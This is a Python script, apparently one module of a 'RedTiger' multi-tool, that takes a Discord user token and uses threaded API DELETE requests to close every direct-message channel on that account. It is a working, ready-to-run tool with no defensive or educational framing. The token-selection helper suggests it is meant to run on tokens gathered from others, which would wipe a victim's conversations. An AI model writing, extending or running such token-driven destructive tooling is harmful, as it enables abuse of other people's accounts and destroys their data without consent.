# Copyright (c) RedTiger 
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN: 
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR: 
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

from Config.Util import *
from Config.Config import *
try:
    import requests
    import threading
except Exception as e:
   ErrorModule(e)
   
Title("Discord Token Delete Dm")

try:
    Slow(discord_banner)
    token = Choice1TokenDiscord()
    r = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
    if r.status_code == 200:
        pass
    else:
        ErrorToken()

    def DmDeleter(token, channels):
        for channel in channels:
            try:
                requests.delete(f'https://discord.com/api/v7/channels/'+channel['id'], headers={'Authorization': token})
                print(f"{BEFORE + current_time_hour() + AFTER} {ADD} Status: {white}Delete{red} | Channel: {white}{channel['id']}")
            except Exception as e:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Status: {white}Error: {e}{red}")

    processes = []
    channel_id = requests.get("https://discord.com/api/v9/users/@me/channels", headers={'Authorization': token}).json()
    if not channel_id:
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} No dm found.")
        Continue()
        Reset()

    for channel in [channel_id[i:i+3] for i in range(0, len(channel_id), 3)]:
            t = threading.Thread(target=DmDeleter, args=(token, channel))
            t.start()
            processes.append(t)
    for process in processes:
        process.join()
    Continue()
    Reset()
except Exception as e:
    Error(e)